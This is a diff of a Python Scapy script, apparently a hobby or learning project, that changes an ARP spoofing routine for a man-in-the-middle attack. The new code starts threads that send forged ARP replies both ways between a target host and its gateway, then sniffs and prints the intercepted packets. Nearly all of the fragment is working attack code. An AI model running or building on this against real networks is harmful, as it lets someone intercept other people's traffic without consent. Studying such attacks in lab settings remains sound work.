@@ -48,14 +48,24 @@ def arp_scan(target_ip = '192.168.0.0/24'):
 
 def smart_sniff(target_ip, gateway_ip):
 
-
-    send(nc.craft_arp_spoof(target_ip, gateway_ip), count=10, verbose=False)
-    send(nc.craft_arp_spoof(gateway_ip, target_ip), count=10, verbose=False)
-    sniff(filter="src " + target_ip, count =1)
-    sniff(filter="src " + gateway_ip, count =1)
+    target = False
+    gateway = False
+    
+    t = threading.Thread(target=soft_spoof, args=(target_ip, gateway_ip, target))
+    t.start()
+    t = threading.Thread(target=soft_spoof, args=(gateway_ip, target_ip, gateway))
+    t.start()
+    
+    time.sleep(3)
+    sniff(prn=lambda x : x.show(), count=5) 
     print("on est la tu connais")
 
-
+def soft_spoof(target_ip, gateway_ip, bool):
+    t = threading.currentThread()
+    print("soft_spoof")
+    send(craft_arp_spoof(target_ip, gateway_ip), count=50, verbose=True)
+    bool = True
+    # TODO traiter les paquets
 
 # Sniff package and display them (MITM attack)
 def sniffing(src, dst):
@@ -78,6 +88,7 @@ def sniffing(src, dst):
 
     
     sniff(prn=editPkg, filter="src " + src, stop_filter = lambda x: not getattr(threading.currentThread(), "do_run", True) )
+    
 
 # Craft an ARP packet design to spoof
 def craft_arp_spoof(target_ip, gateway_ip):
